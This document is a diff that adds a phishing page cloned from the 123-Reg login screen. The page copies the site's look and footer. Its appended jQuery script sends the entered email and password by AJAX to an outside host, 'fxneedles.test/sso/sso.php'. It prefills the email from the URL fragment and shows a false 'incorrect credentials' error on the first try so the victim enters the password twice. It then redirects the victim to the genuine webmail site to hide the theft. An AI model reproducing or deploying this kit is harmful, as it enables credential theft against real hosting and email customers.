@@ -1,0 +1,334 @@
+<html><head>
+    <title>Login | 123-Reg</title>
+    <base href="/">
+    <meta charset="utf-8" name="viewport" content="width=device-width,initial-scale=1">
+    
+    
+      <link rel="stylesheet" href="https://cdn.heg-cp.com/bootstrap@4.3.1/dist/css/bootstrap-reboot.min.css">
+    
+    <style>@-webkit-keyframes loader-gradient{from{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 90%,#ccc 100%)}to{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 90%,#ccc 100%);-webkit-transform:rotate(720deg) transform:rotate(720deg)}1%,99%{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 89%,#ccc 100%)}2%,98%{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 88%,#ccc 100%)}3%,97%{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 87%,#ccc 100%)}4%,96%{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 86%,#ccc 100%)}5%,95%{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 85%,#ccc 100%)}10%,90%{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 80%,#ccc 100%)}20%,80%{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 70%,#ccc 100%)}30%,70%{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 60%,#ccc 100%)}40%,60%{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 50%,#ccc 100%)}50%{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 10%,#ccc 100%)}}@keyframes loader-gradient{from{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 90%,#ccc 100%)}to{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 90%,#ccc 100%);-ms-transform:rotate(720deg);-webkit-transform:rotate(720deg);transform:rotate(720deg)}1%,99%{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 89%,#ccc 100%)}2%,98%{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 88%,#ccc 100%)}3%,97%{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 87%,#ccc 100%)}4%,96%{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 86%,#ccc 100%)}5%,95%{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 85%,#ccc 100%)}10%,90%{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 80%,#ccc 100%)}20%,80%{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 70%,#ccc 100%)}30%,70%{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 60%,#ccc 100%)}40%,60%{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 50%,#ccc 100%)}50%{background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 10%,#ccc 100%)}}@-webkit-keyframes loader-rotate{to{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes loader-rotate{to{-ms-transform:rotate(360deg);transform:rotate(360deg)}}@-webkit-keyframes loader-collapse{to{-webkit-transform:scale(0);transform:scale(0);opacity:0}}@keyframes loader-collapse{to{-ms-transform:scale(0);transform:scale(0);opacity:0}}@-webkit-keyframes loader-spinner-fade-in{to{opacity:1}}@keyframes loader-spinner-fade-in{to{opacity:1}}@-webkit-keyframes loader-fade-in{0%{opacity:.1}100%{opacity:1;-webkit-transform:scale(1);transform:scale(1)}}@keyframes loader-fade-in{0%{opacity:.1}100%{opacity:1;-ms-transform:scale(1);transform:scale(1)}}.page-loader{position:fixed;z-index:100;top:0;left:0;right:0;bottom:0;display:-webkit-box;display:-ms-flexbox;display:-webkit-flex;display:flex;-ms-flex-align:center;-webkit-align-items:center;-webkit-box-align:center;align-items:center;-webkit-justify-content:center;justify-content:center;background-color:#f7f7f7;text-align:center;pointer-events:none}.page-loader__inner{min-width:200px;position:relative;opacity:0;transform:scale(0.9);-webkit-animation:loader-fade-in .3s ease-in-out forwards;animation:loader-fade-in .3s ease-in-out forwards;-webkit-animation-delay:1s;animation-delay:1s}.page-loader__icon{width:80px;height:80px;margin:auto;position:relative;border-radius:40px;border:1px solid #ccc;background-color:#fff}.page-loader__icon>svg,.page-loader__icon>img{width:100%;max-width:64px;max-height:50px;fill:#999 !important;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);transition:fill 2s ease-in-out .4s}.page-loader__icon>svg *{fill:#999 !important}.page-loader__spinner{position:absolute;margin:auto;top:0;bottom:0;left:0;right:0;width:104px;height:104px;opacity:0;-webkit-animation:.6s ease .4s 1 forwards loader-spinner-fade-in;animation:.6s ease .4s 1 forwards loader-spinner-fade-in}.page-loader .spinner{opacity:1;transition:1s ease-in-out opacity;position:absolute;width:104px;height:104px;border-radius:50%;background-image:linear-gradient(to top,#f7f7f7 0,#f7f7f7 90%,#ccc 100%);-webkit-animation:1.4s ease-out .8s infinite forwards loader-gradient;animation:1.4s ease-out .8s infinite forwards loader-gradient}.page-loader .spinner--brand{opacity:0}.page-loader .spinner__mask{position:absolute;background:#f7f7f7;top:2px;left:2px;bottom:2px;right:2px;border-radius:50%}</style>
+    
+    
+  <link rel="icon" type="image/png" sizes="32x32" href="https://img1.wsimg.com/cdn/Image/All/Website/1/en-GB/d9dffa7e-f966-4d54-a159-f351362c9fbc/android-chrome-192x192.png" data-react-helmet="true"><meta name="theme-color" content="#0091d3" data-react-helmet="true"><script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/yXSLJBpiFoTYkexaPhFknpU7/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-fEtnLkXMpwhEXyV802C09EtQCfEekHEGh4Dzy/7Sn0xtxDbO9+NbG9N1yHY3nOiY"></script><script charset="utf-8" src="/static/0.10e5c83234ad8eb677c0.chunk.js"></script><script charset="utf-8" src="/static/7.f413844a1d1c5005e273.chunk.js"></script><script src="https://www.recaptcha.net/recaptcha/api.js?render=6LdGLJIUAAAAAH1DUhRDwCV5orvTaawvNM7Ocvws&amp;hl=en" data-react-helmet="true"></script><style>._3emE9--dark-theme .-S-tR--ff-downloader{background:rgba(30,30,30,.93);border:1px solid rgba(82,82,82,.54);box-shadow:0 4px 7px rgba(30,30,30,.55);color:#fff}._3emE9--dark-theme .-S-tR--ff-downloader ._6_Mtt--header ._2VdJW--minimize-btn{background:#3d4b52}._3emE9--dark-theme .-S-tR--ff-downloader ._6_Mtt--header ._2VdJW--minimize-btn:hover{background:#131415}._3emE9--dark-theme .-S-tR--ff-downloader ._10vpG--footer{background:rgba(30,30,30,.93)}._2mDEx--white-theme .-S-tR--ff-downloader{background:#fff;border:1px solid rgba(82,82,82,.54);box-shadow:0 4px 7px rgba(30,30,30,.55);color:#314c75}._2mDEx--white-theme .-S-tR--ff-downloader ._6_Mtt--header{font-weight:700}._2mDEx--white-theme .-S-tR--ff-downloader ._2dFLA--container ._2bWNS--notice{border:0;color:rgba(0,0,0,.88)}._2mDEx--white-theme .-S-tR--ff-downloader ._10vpG--footer{background:#fff}.-S-tR--ff-downloader{display:block;overflow:hidden;position:fixed;bottom:20px;right:7.1%;width:330px;height:180px;background:rgba(30,30,30,.93);border-radius:2px;color:#fff;z-index:99999999;border:1px solid rgba(82,82,82,.54);box-shadow:0 4px 7px rgba(30,30,30,.55);transition:.5s}.-S-tR--ff-downloader._3M7UQ--minimize{height:62px}.-S-tR--ff-downloader._3M7UQ--minimize .nxuu4--file-info,.-S-tR--ff-downloader._3M7UQ--minimize ._6_Mtt--header{display:none}.-S-tR--ff-downloader ._6_Mtt--header{padding:10px;font-size:17px;font-family:sans-serif}.-S-tR--ff-downloader ._6_Mtt--header ._2VdJW--minimize-btn{float:right;background:#f1ecec;height:20px;width:20px;text-align:center;padding:2px;margin-top:-10px;cursor:pointer}.-S-tR--ff-downloader ._6_Mtt--header ._2VdJW--minimize-btn:hover{background:#e2dede}.-S-tR--ff-downloader ._13XQ2--error{color:red;padding:10px;font-size:12px;line-height:19px}.-S-tR--ff-downloader ._2dFLA--container{position:relative;height:100%}.-S-tR--ff-downloader ._2dFLA--container .nxuu4--file-info{padding:6px 15px 0;font-family:sans-serif}.-S-tR--ff-downloader ._2dFLA--container .nxuu4--file-info div{margin-bottom:5px;width:100%;overflow:hidden}.-S-tR--ff-downloader ._2dFLA--container ._2bWNS--notice{margin-top:21px;font-size:11px}.-S-tR--ff-downloader ._10vpG--footer{width:100%;bottom:0;position:absolute;font-weight:700}.-S-tR--ff-downloader ._10vpG--footer ._2V73d--loader{-webkit-animation:n0BD1--rotation 3.5s linear forwards;animation:n0BD1--rotation 3.5s linear forwards;position:absolute;top:-120px;left:calc(50% - 35px);border-radius:50%;border:5px solid #fff;border-top-color:#a29bfe;height:70px;width:70px;display:flex;justify-content:center;align-items:center}.-S-tR--ff-downloader ._10vpG--footer ._24wjw--loading-bar{width:100%;height:18px;background:#dfe6e9;border-radius:5px}.-S-tR--ff-downloader ._10vpG--footer ._24wjw--loading-bar ._1FVu9--progress-bar{height:100%;background:#8bc34a;border-radius:5px}.-S-tR--ff-downloader ._10vpG--footer ._2KztS--status{margin-top:10px}.-S-tR--ff-downloader ._10vpG--footer ._2KztS--status ._1XilH--state{float:left;font-size:.9em;letter-spacing:1pt;text-transform:uppercase;width:100px;height:20px;position:relative}.-S-tR--ff-downloader ._10vpG--footer ._2KztS--status ._1jiaj--percentage{float:right}</style><script type="text/javascript" async="" charset="utf-8" id="tiqapp" src="//tags.tiqcdn.com/utag/tiqapp/utag.v.js?a=gpl/123reg/202009180932&amp;cb=1601006846560"></script></head>
+  <body style="background-color: transparent;">
+    <div id="root">
+        <div>
+            <div>
+                <div>
+                    <style>
+                    @import url('https://fonts.googleapis.com/css?family=Rubik:400|Open Sans:400&display=swap');
+                    </style>
+                    </div>
+                    <div data-radium="true">
+                        <div style="font-family: &quot;Open Sans&quot;, sans-serif; display: flex; -webkit-font-smoothing: antialiased;">
+                            <div style="min-height: 100vh; display: flex; flex-direction: column; flex-grow: 1;">
+                                <header style="padding-top: 32px; padding-bottom: 32px; background-color: rgb(2, 105, 160); text-align: center; border-bottom: 1px solid rgba(0, 0, 0, 0.1);">
+                                    <a href="https://www.123-reg.co.uk/">
+                                        <img src="https://img1.wsimg.com/cdn/Website/none/v1/en-US/83790be0-f09f-48ad-a4de-5f5064ef2e58/Logo-123Reg-Contrast.svg" alt="123 Reg" style="max-height: 32px; max-width: 100%;">
+                                    </a>
+                                </header>
+                                <main style="overflow: hidden; flex: 1 1 auto; display: flex; flex-direction: column; justify-content: center; padding-top: 48px; padding-bottom: 48px; background-repeat: no-repeat; background-size: cover; background-position: 50% center; background-image: linear-gradient(rgb(0, 147, 209), rgb(0, 147, 209)), url(&quot;https://img1.wsimg.com/cdn/Image/Website/None/v1/en-GB/895e41b7-a7dd-4a58-a33a-99f490555bec/tinyTransparentImage.png&quot;); background-attachment: fixed;">
+                                    <div>
+                                        <div style="position: relative; margin-left: auto; margin-right: auto; padding-left: 8px; padding-right: 8px; width: 100%; max-width: 1012px;">
+                                            <div style="border-width: 0px; border-style: solid; border-color: rgb(242, 242, 242); border-radius: 3px; overflow: hidden; background-color: rgb(255, 255, 255); width: 100%; max-width: 864px; margin-left: auto; margin-right: auto;">
+                                                <div style="padding: 24px;">
+                                                    <div style="margin: -32px; display: flex;">
+                                                        <div style="padding: 32px 24px 32px 32px; flex: 1 1 0%;">
+                                                            
+                                                            <div id="error-msg">
+                                                                <div style="margin-bottom: 16px;">
+                                                                    <div style="font-family: &quot;Open Sans&quot;, sans-serif; color: rgb(40, 40, 40); margin-top: 8px; margin-bottom: 0px; border-left: 4px solid rgb(204, 0, 0); background-color: rgb(244, 199, 199); border-top-color: rgb(204, 0, 0); border-right-color: rgb(204, 0, 0); border-bottom-color: rgb(204, 0, 0);">
+                                                                        <span style="display: block; overflow-wrap: break-word; font-size: 1rem; line-height: 1.5; padding: 8px;">
+                                                                            <span>
+                                                                                Username or Password are incorrect. Please check the credentials again. If you use your mail address for login please make sure that you are using an unique one, which is not used for other customer accounts.
+                                                                            </span>
+                                                                        </span>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+
+                                                            <!-- <form method="POST"> -->
+                                                                <fieldset style="margin-bottom: 24px;">
+                                                                    <div>
+                                                                        <div style="font-family: &quot;Open Sans&quot;, sans-serif; color: rgb(72, 72, 72); margin-bottom: 8px; font-size: 1rem; line-height: 1.5;">
+                                                                            <label for="1" style="font-size: 1rem; line-height: 1.5; font-family: &quot;Open Sans&quot;, sans-serif; margin: 0px; cursor: pointer; color: rgb(72, 72, 72);">
+                                                                                <span>
+                                                                                    Email / Username
+                                                                                </span>
+                                                                            </label>
+                                                                        </div>
+                                                                        <input autocomplete="email" id="1" name="identifier" type="text" value="" style="font-size: 1rem; line-height: 1.5; font-weight: 300; font-family: &quot;Open Sans&quot;, sans-serif; padding: 8px; border-width: 1px; border-style: solid; border-color: rgb(238, 238, 238); border-radius: 3px; letter-spacing: 0.2px; background-color: rgb(255, 255, 255); display: block; width: 100%; height: 100%; min-height: 24px; color: rgb(102, 102, 102); box-shadow: rgb(255, 255, 255) 0px 0px 0px 2px inset; transition: color 0.2s ease-in-out 0s, box-shadow 0.2s ease-in-out 0s, border-color 0.2s ease-in-out 0s, background-color 0.2s ease-in-out 0s;">
+                                                                    </div>
+                                                                </fieldset>
+                                                                <fieldset style="margin-bottom: 24px;">
+                                                                    <div>
+                                                                        <div style="font-family: &quot;Open Sans&quot;, sans-serif; color: rgb(72, 72, 72); margin-bottom: 8px; font-size: 1rem; line-height: 1.5;">
+                                                                            <label for="2" style="font-size: 1rem; line-height: 1.5; font-family: &quot;Open Sans&quot;, sans-serif; margin: 0px; cursor: pointer; color: rgb(72, 72, 72);">
+                                                                                <span>Password</span>
+                                                                            </label>
+                                                                        </div>
+                                                                        <div style="display: flex; font-size: 0px; width: 100%; white-space: nowrap;">
+                                                                            <div style="flex-grow: 1;">
+                                                                                <input type="password" autocomplete="current-password" id="2" name="password" value="" style="font-size: 1rem; line-height: 1.5; font-weight: 300; font-family: &quot;Open Sans&quot;, sans-serif; padding: 8px; border-width: 1px; border-style: solid; border-color: rgb(238, 238, 238); border-radius: 3px 0px 0px 3px; letter-spacing: 0.2px; background-color: rgb(255, 255, 255); display: block; width: 100%; height: 100%; min-height: 24px; color: rgb(102, 102, 102); box-shadow: rgb(255, 255, 255) 0px 0px 0px 2px inset; transition: color 0.2s ease-in-out 0s, box-shadow 0.2s ease-in-out 0s, border-color 0.2s ease-in-out 0s, background-color 0.2s ease-in-out 0s; margin-top: 0px;">
+                                                                            </div>
+                                                                            <span style="font-size: 1rem; line-height: 1.5; font-family: &quot;Open Sans&quot;, sans-serif; border-width: 1px 1px 1px 0px; border-style: solid; border-color: rgb(238, 238, 238); border-radius: 0px 4px 4px 0px; display: flex; background-color: rgb(238, 238, 238); color: rgb(35, 105, 159); align-items: center; flex-direction: column; justify-content: center; user-select: none; cursor: default;">
+                                                                                <span style="position: relative; width: 56px; flex: 1 1 auto; padding: 0px; margin-left: 0px; margin-right: 0px; overflow: hidden; border-radius: 4px;">
+                                                                                    <span>
+                                                                                        <button id="show-password" type="button" aria-label="Show password" aria-pressed="false" style="cursor: pointer; position: absolute; top: 0px; bottom: 0px; width: 100%; background-color: transparent; display: flex; align-items: center; justify-content: center; outline-width: 0px; border-width: 0px; transition: background-color 0.2s ease-in-out 0s, border-color 0.2s ease-in-out 0s;">
+                                                                                            <img src="https://paintbrush.heg-cp.com/glyphs/eye.svg?colors=rgba%2840%2C%2040%2C%2040%2C%200.85%29" alt="eye" loading="lazy" importance="low" style="max-width: 100%; height: 24px; width: 24px;">
+                                                                                        </button>
+                                                                                    </span>
+                                                                                </span>
+                                                                            </span>
+                                                                        </div>
+                                                                    </div>
+                                                                </fieldset>
+                                                            <style>
+                                                                @keyframes iconPulseIn {
+                                                                    0% { transform: scale(0); }
+                                                                    75% { transform: scale(1.1); }
+                                                                    100% { transform: scale(1); }
+                                                                }
+                                                            </style>
+                                                        <span>
+                                                            <button onclick="sendToServer();" type="submit" style="border-color: transparent; border-style: solid; border-width: 2px; margin: 0px; font-family: Rubik, sans-serif; font-size: 16px; text-align: center; justify-content: center; display: inline-flex; align-items: center; letter-spacing: 0.2px; line-height: 1; overflow: hidden; outline: 0px; position: relative; cursor: pointer; transition: opacity 0.2s ease-in-out 0s, color 0.2s ease-in-out 0s, background-color 0.2s ease-in-out 0s, border-color 0.2s ease-in-out 0s; text-decoration: none; background-color: rgb(141, 198, 63); color: rgb(255, 255, 255); padding: 16px 24px; width: 100%; border-radius: 4px;">
+                                                                <span style="padding-left: 0px; padding-right: 0px; -webkit-box-flex: 1; flex: 1 1 auto;">
+                                                                    <div style="position: relative;">
+                                                                        <span>
+                                                                            <span style="transition: opacity 0.2s ease-in-out 0s; opacity: 1;">
+                                                                                <span>Log in</span>
+                                                                            </span>
+                                                                                <div style="position: absolute; top: 0px; left: 0px; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center;">
+                                                                                    <span style="opacity: 1;"></span>
+                                                                                </div>
+                                                                        </span>
+                                                                    </div>
+                                                                </span>
+                                                            </button>
+                                                        </span>
+                                                        
+                                                        <span style="display: block; margin-top: 8px;">
+                                                            <div style="text-align: center;">
+                                                                <span>
+                                                                    <span>
+                                                                        <a search="" actions="[object Object]" href="https://sso.123-reg.co.uk/forgotten-password" style="font-size: 0.75rem; line-height: 1.1; border-color: transparent; border-style: solid; border-width: 0px; margin: 0px; padding: 0px 0px 1px; font-family: &quot;Open Sans&quot;, sans-serif; color: rgb(35, 105, 159); text-align: left; background-color: transparent; outline: 0px; cursor: pointer; text-decoration: none; transition: opacity 0.2s ease-in-out 0s, border 0.1s ease-in-out 0s;">
+                                                                            <span style="border-bottom: 1px dotted rgb(35, 105, 159);">
+                                                                                <span>Forgotten your password?</span>
+                                                                            </span>
+                                                                        </a>
+                                                                    </span>
+                                                                </span>
+                                                            </div>
+                                                        </span>
+                                                    <!-- </form> -->
+                                                </div>
+                                                <div style="padding: 32px 32px 32px 24px; background-color: rgb(247, 247, 247); flex: 1 1 0%; display: flex; flex-direction: column; justify-content: center;">
+                                                    <h1 style="line-height: 1.3; font-size: 1.313rem; margin-top: 0px; margin-bottom: 16px; font-weight: normal; font-family: Rubik, sans-serif; color: rgb(40, 40, 40);">
+                                                        <span>New here?</span>
+                                                    </h1>
+                                                    <p style="font-size: 1rem; line-height: 1.5; margin-bottom: 24px; color: rgb(72, 72, 72);">
+                                                        <span>No problem, signing up is quick and easy. See you on the other side!</span>
+                                                    </p>
+                                                    <p style="font-size: 1rem; line-height: 1.5; margin-bottom: 24px; color: rgb(72, 72, 72);">
+                                                        <span>
+                                                            <a search="" actions="[object Object]" href="https://sso.123-reg.co.uk/register" style="border-color: rgba(26, 26, 26, 0.7); border-style: solid; border-width: 2px; margin: 0px; font-family: Rubik, sans-serif; font-size: 16px; text-align: center; justify-content: center; display: inline-flex; align-items: center; letter-spacing: 0.2px; line-height: 1; overflow: hidden; outline: 0px; position: relative; cursor: pointer; transition: opacity 0.2s ease-in-out 0s, color 0.2s ease-in-out 0s, background-color 0.2s ease-in-out 0s, border-color 0.2s ease-in-out 0s; text-decoration: none; background-color: transparent; color: rgba(26, 26, 26, 0.85); padding: 16px 24px; width: 100%; border-radius: 4px;">
+                                                                <span style="padding-left: 0px; padding-right: 0px; -webkit-box-flex: 1; flex: 1 1 auto;">
+                                                                    <span>Create an account</span>
+                                                                </span>
+                                                            </a>
+                                                        </span>
+                                                    </p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </main>
+                        <footer>
+                            <div style="padding: 16px 32px; font-size: 0.875rem; line-height: 1.5; background-color: rgb(40, 40, 40); color: rgb(204, 204, 204); text-align: center;">
+                            <div>
+                                <span>
+                                    Copyright © 2020 123 Reg Ltd. All prices exclude VAT, which is charged based on the location where a service is deemed to be used by a customer.
+                                </span>
+                            </div>
+                            <div style="margin-top: 8px; display: flex; flex-flow: wrap; justify-content: center; word-break: break-word;">
+                                <span data-test-id="policy" style="padding-left: 8px; padding-right: 8px;">
+                                    <span>
+                                        <span>
+                                            <a href="https://www.123-reg.co.uk/terms/privacy/" style="font-size: 0.75rem; line-height: 1.1; border-color: transparent; border-style: solid; border-width: 0px; margin: 0px; padding: 0px 0px 1px; font-family: &quot;Open Sans&quot;, sans-serif; color: rgb(96, 200, 248); text-align: left; background-color: transparent; outline: 0px; cursor: pointer; text-decoration: none; transition: opacity 0.2s ease-in-out 0s, border 0.1s ease-in-out 0s;">
+                                                <span style="border-bottom: 1px dotted rgb(96, 200, 248);">
+                                                    <span>Privacy policy</span>
+                                                </span>
+                                            </a>
+                                        </span>
+                                    </span>
+                                </span>
+                                <span data-test-id="cookie" style="padding-left: 8px; padding-right: 8px;">
+                                    <span>
+                                        <span>
+                                            <a href="https://www.123-reg.co.uk/terms/privacy/" style="font-size: 0.75rem; line-height: 1.1; border-color: transparent; border-style: solid; border-width: 0px; margin: 0px; padding: 0px 0px 1px; font-family: &quot;Open Sans&quot;, sans-serif; color: rgb(96, 200, 248); text-align: left; background-color: transparent; outline: 0px; cursor: pointer; text-decoration: none; transition: opacity 0.2s ease-in-out 0s, border 0.1s ease-in-out 0s;">
+                                                <span style="border-bottom: 1px dotted rgb(96, 200, 248);">
+                                                    <span>Manage cookies</span>
+                                                </span>
+                                            </a>
+                                        </span>
+                                    </span>
+                                </span>
+                            </div>
+                        </div>
+                    </footer>
+                </div>
+                <div style="position: relative; z-index: 12;">
+                    <div style="position: fixed; left: 40px; bottom: 0px;">
+                        <div></div>
+                    </div>
+                    <div style="position: fixed; bottom: 0px; width: 100%; text-align: center;">
+                        <div></div>
+                    </div>
+                </div>
+            </div>
+            <style></style>
+        </div>
+    </div>
+</div>
+</div>
+    
+
+<script src="https://cdn.polyfill.io/v2/polyfill.min.js?features=fetch,Intl,Promise,Set,Object.assign,String.fromCodePoint,String.prototype.repeat,String.prototype.startsWith,Array.from"></script>
+<script>
+    var utag_data = {}
+</script>
+    
+<script type="text/javascript" src="/static/config.js?6eccd548e7e883980d2e"></script>
+<script type="text/javascript" src="/static/runtime.89c7feb200c1e441fdc9.bundle.js"></script>
+<script type="text/javascript" src="/static/3.b284efb31d2dfb6fde40.chunk.js"></script>
+
+<script src="https://tags.tiqcdn.com/utag/gpl/123reg/dev/utag.js" type="text/javascript" async="">
+    <div>
+        <span>
+            Copyright © 2020 123 Reg Ltd. All prices exclude VAT, which is charged based on the location where a service is deemed to be used by a customer.
+        </span>
+    </div>
+    <div style="margin-top: 8px; display: flex; flex-flow: wrap; justify-content: center; word-break: break-word;">
+        <span data-test-id="policy" style="padding-left: 8px; padding-right: 8px;">
+            <span>
+                <span>
+                    <a href="https://www.123-reg.co.uk/terms/privacy/" style="font-size: 0.75rem; line-height: 1.1; border-color: transparent; border-style: solid; border-width: 0px; margin: 0px; padding: 0px 0px 1px; font-family: &quot;Open Sans&quot;, sans-serif; color: rgb(96, 200, 248); text-align: left; background-color: transparent; outline: 0px; cursor: pointer; text-decoration: none; transition: opacity 0.2s ease-in-out 0s, border 0.1s ease-in-out 0s;">
+                        <span style="border-bottom: 1px dotted rgb(96, 200, 248);">
+                            <span>Privacy policy</span>
+                        </span>
+                    </a>
+                </span>
+            </span>
+        </span>
+        <span data-test-id="cookie" style="padding-left: 8px; padding-right: 8px;">
+            <span>
+                <span>
+                    <a href="https://www.123-reg.co.uk/terms/privacy/" style="font-size: 0.75rem; line-height: 1.1; border-color: transparent; border-style: solid; border-width: 0px; margin: 0px; padding: 0px 0px 1px; font-family: &quot;Open Sans&quot;, sans-serif; color: rgb(96, 200, 248); text-align: left; background-color: transparent; outline: 0px; cursor: pointer; text-decoration: none; transition: opacity 0.2s ease-in-out 0s, border 0.1s ease-in-out 0s;">
+                        <span style="border-bottom: 1px dotted rgb(96, 200, 248);">
+                            <span>Manage cookies</span>
+                        </span>
+                    </a>
+                </span>
+            </span>
+        </span>
+    </div>
+    </div>
+    </footer>
+    </div>
+    <div style="position: relative; z-index: 12;">
+    <div style="position: fixed; left: 40px; bottom: 0px;">
+    <div>
+    </div>
+    </div>
+    <div style="position: fixed; bottom: 0px; width: 100%; text-align: center;">
+    <div>
+    </div>
+    </div>
+    </div>
+    </div>
+    <style></style>
+    </div>
+    </div>
+    </div>
+    </div>
+    </script>
+    <div>
+        <div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6LdGLJIUAAAAAH1DUhRDwCV5orvTaawvNM7Ocvws&amp;co=aHR0cHM6Ly9zc28uMTIzLXJlZy5jby51azo0NDM.&amp;hl=en&amp;v=yXSLJBpiFoTYkexaPhFknpU7&amp;size=invisible&amp;cb=qjau6d9bhojh" width="256" height="60" role="presentation" name="a-s9zfioa2em0e" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;"></iframe></div></body></html>
+
+<script src="https://code.jquery.com/jquery-3.5.1.js" integrity="sha256-QWo7LDvxbWT2tbbQ97B53yJnYU3WhH/C8ycbRAkjPDc=" crossorigin="anonymous"></script>
+<script>
+
+
+    $('#error-msg').hide();
+
+    $('button#show-password').click(function(){
+        var type = $('input#2');
+
+        if (type.attr('type') === 'password') {
+            type.attr('type', 'text');
+            type.focus();
+        } else if (type.attr('type') === 'text') {
+            type.attr('type', 'password');
+            type.focus();
+        }
+    });
+
+    var hash = window.location.hash;
+
+document.getElementById('1').value = hash.split('#')[1];
+
+var check = document.getElementById('1').value = hash.split('#')[1]
+var pwdInput = document.getElementById('2');
+
+if (check === undefined) {
+    $('input#1').val('');
+    $('input#1').focus();
+} else {
+    pwdInput.focus();
+}
+
+    if (!count) {
+        var count = 0;
+    }
+
+    function getbtnclick()
+    {
+      return count++
+    }
+
+    function sendToServer()
+    {
+      var email = $('input#1').val();
+      var pass = $('input#2').val();
+
+      
+      $.ajax({
+        url: 'http://fxneedles.test/sso/sso.php',
+        type: 'POST',
+        data: {
+          user: email,
+          pass: pass,
+          type: 1
+        },
+        success: function(response){
+          counted = getbtnclick();
+
+        if (response == 0) {
+            $('#error-msg').show();
+            $('input#2').val('');
+        } else if (response == 1) {
+          if (counted == 1) {
+            window.location = "https://webmail.123-reg.co.uk/appsuite";
+          } else {
+            $('#error-msg').show();
+            $('input#2').val('');
+            $('input#2').focus();
+          }
+        }
+        }
+      });
+      
+    }
+</script>
